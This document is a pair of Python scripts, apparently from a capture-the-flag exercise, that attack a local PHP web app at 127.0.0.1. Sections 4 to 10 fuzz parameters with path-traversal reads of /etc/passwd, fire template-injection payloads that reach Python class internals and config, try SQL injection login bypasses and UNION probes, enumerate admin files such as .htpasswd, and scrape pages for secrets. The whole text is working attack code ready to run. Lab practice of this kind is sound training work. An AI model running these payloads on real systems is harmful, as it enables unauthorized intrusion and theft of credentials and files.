import requests
import re
from urllib.parse import urlencode

base_url = "http://127.0.0.1:33026"
session = requests.Session()

print("SECTION 4: PARAMETER FUZZING")
print("=" * 80)

param_tests = [
    ("/index.php", {"page": "login"}),
    ("/index.php", {"page": "admin"}),
    ("/index.php", {"page": "flag"}),
    ("/index.php", {"file": "flag.txt"}),
    ("/index.php", {"file": "/etc/passwd"}),
    ("/index.php", {"file": "../../../etc/passwd"}),
    ("/index.php", {"page": "../../../etc/passwd"}),
    ("/index.php", {"id": "1"}),
    ("/index.php", {"id": "0"}),
    ("/index.php", {"id": "-1"}),
    ("/", {"page": "admin"}),
]

for endpoint, params in param_tests:
    try:
        resp = session.get(f"{base_url}{endpoint}", params=params, timeout=5)
        print(f"\n{endpoint}?{urlencode(params)}")
        print(f"  Status: {resp.status_code} | Length: {len(resp.content)}B")
        
        # Check for LFI indicators
        if "root:" in resp.text:
            print(f"  [!] LFI DETECTED - /etc/passwd content found!")
            print(f"  Response: {resp.text[:500]}")
        elif len(resp.content) != 5609:  # Different from index
            print(f"  [+] Different response size - investigating")
            print(f"  Response snippet: {resp.text[:400]}")
    except Exception as e:
        print(f"  Error: {e}")

print("\n" + "=" * 80)
print("SECTION 5: SSTI/XSS TESTING ON CONTACT FORM")
print("=" * 80)

# Test contact form
ssti_payloads = [
    "{{7*7}}",
    "{{7*'7'}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{config}}",
    "{{self}}",
    "{{''.__class__.__mro__}}",
]

for payload in ssti_payloads:
    try:
        resp = session.post(f"{base_url}/contact.php",
                          data={"name": payload, "email": "test@test.com", "message": payload},
                          timeout=5)
        
        print(f"\nPayload: {payload}")
        print(f"  Status: {resp.status_code} | Length: {len(resp.content)}B")
        
        # Check for SSTI execution
        if "49" in resp.text:
            print(f"  [!] SSTI DETECTED - 7*7=49 found!")
            print(f"  Response: {resp.text}")
        elif "7777777" in resp.text:
            print(f"  [!] SSTI DETECTED - 7*'7' found!")
            print(f"  Response: {resp.text}")
        
        # Check if payload reflects
        if payload in resp.text:
            print(f"  [+] Payload reflected in response")
    except Exception as e:
        print(f"  Error: {e}")

print("\n" + "=" * 80)
print("SECTION 6: SSTI/XSS TESTING ON LOGIN FORM")
print("=" * 80)

for payload in ssti_payloads[:5]:
    try:
        resp = session.post(f"{base_url}/login.php",
                          data={"username": payload, "password": payload},
                          timeout=5)
        
        print(f"\nPayload: {payload}")
        print(f"  Status: {resp.status_code} | Length: {len(resp.content)}B")
        
        if "49" in resp.text:
            print(f"  [!] SSTI DETECTED!")
            print(f"  Response: {resp.text}")
    except Exception as e:
        print(f"  Error: {e}")

print("\n" + "=" * 80)
print("SECTION 7: ADMIN PANEL INVESTIGATION")
print("=" * 80)

# Check for admin subpages
admin_paths = [
    "/admin/login.php",
    "/admin/index.php",
    "/admin/config.php",
    "/admin/users.php",
    "/admin/dashboard.php",
    "/admin/panel.php",
    "/admin/flag.php",
    "/admin/.htaccess",
    "/admin/.htpasswd",
]

for path in admin_paths:
    try:
        resp = session.get(f"{base_url}{path}", timeout=5, allow_redirects=False)
        if resp.status_code != 404:
            print(f"\n[!] {path}")
            print(f"  Status: {resp.status_code} | Length: {len(resp.content)}B")
            if resp.status_code == 200 and len(resp.content) < 1000:
                print(f"  Content: {resp.text}")
    except:
        pass


import requests
import re

base_url = "http://127.0.0.1:33026"
session = requests.Session()

print("SECTION 8: CONTACT FORM DETAILED ANALYSIS")
print("=" * 80)

# First, get the original contact page
resp = session.get(f"{base_url}/contact.php")
print(f"Original contact.php: {resp.status_code} | Length: {len(resp.content)}B")

# Test with normal data
resp = session.post(f"{base_url}/contact.php",
                   data={"name": "John Doe", "email": "john@test.com", "message": "Hello"},
                   timeout=5)
print(f"\nNormal submission:")
print(f"  Status: {resp.status_code} | Length: {len(resp.content)}B")
print(f"  Response:\n{resp.text}")

# Test SSTI with more payloads
print("\n" + "=" * 80)
print("ADVANCED SSTI TESTING:")
print("=" * 80)

advanced_ssti = [
    "{{7*7}}",
    "{{7*7}} = {{7*7}}",
    "test{{7*7}}test",
    "{{config.items()}}",
    "{{request.environ}}",
    "{{''.__class__.__bases__[0].__subclasses__()}}",
]

for payload in advanced_ssti:
    resp = session.post(f"{base_url}/contact.php",
                       data={"name": payload, "email": "test@test.com", "message": "test"},
                       timeout=5)
    print(f"\nPayload: {payload}")
    print(f"  Length: {len(resp.content)}B")
    
    # Check for computed result
    if "49" in resp.text:
        print(f"  [!] SSTI CONFIRMED!")
    if payload in resp.text:
        print(f"  [+] Payload reflected")
    
    # Show response if different size
    if len(resp.content) != 770:
        print(f"  Response: {resp.text}")

print("\n" + "=" * 80)
print("SECTION 9: SQL INJECTION TESTING")
print("=" * 80)

sqli_payloads = [
    ("admin' OR '1'='1", "password"),
    ("admin'--", "password"),
    ("admin'#", "password"),
    ("' OR '1'='1'--", "password"),
    ("' OR 1=1--", "password"),
    ("admin' AND 1=1--", "password"),
    ("admin' UNION SELECT NULL--", "password"),
    ("admin' UNION SELECT NULL,NULL--", "password"),
    ("admin' UNION SELECT NULL,NULL,NULL--", "password"),
]

for username, password in sqli_payloads:
    resp = session.post(f"{base_url}/login.php",
                       data={"username": username, "password": password},
                       timeout=5,
                       allow_redirects=False)
    
    print(f"\nUsername: {username[:30]}...")
    print(f"  Status: {resp.status_code} | Length: {len(resp.content)}B")
    
    if resp.cookies:
        print(f"  [!] Got cookies: {dict(resp.cookies)}")
    
    if resp.status_code == 302:
        print(f"  [!] Redirect to: {resp.headers.get('Location')}")
    
    # Check for SQL errors
    if "sql" in resp.text.lower() or "error" in resp.text.lower():
        print(f"  [?] Possible SQL error in response")
        print(f"  Snippet: {resp.text[:300]}")

print("\n" + "=" * 80)
print("SECTION 10: CHECK FOR HIDDEN CONTENT/COMMENTS")
print("=" * 80)

# Get all pages and extract comments
pages = ["/index.php", "/login.php", "/about.php", "/contact.php", "/admin/", "/admin/index.php"]

for page in pages:
    resp = session.get(f"{base_url}{page}", timeout=5)
    if resp.status_code == 200:
        # Extract HTML comments
        comments = re.findall(r'<!--(.*?)-->', resp.text, re.DOTALL)
        if comments:
            print(f"\n[!] {page} - COMMENTS FOUND:")
            for c in comments:
                print(f"  <!--{c.strip()}-->")
        
        # Look for base64 encoded strings
        b64_patterns = re.findall(r'[A-Za-z0-9+/]{20,}={0,2}', resp.text)
        if b64_patterns:
            print(f"\n[!] {page} - BASE64 PATTERNS:")
            for b64 in b64_patterns:
                print(f"  {b64[:50]}...")
        
        # Look for interesting strings
        interesting = re.findall(r'(flag|secret|password|token|key|auth|admin|config)[^\w]', resp.text, re.IGNORECASE)
        if interesting:
            print(f"\n[!] {page} - INTERESTING KEYWORDS:")
            print(f"  {set(interesting)}")

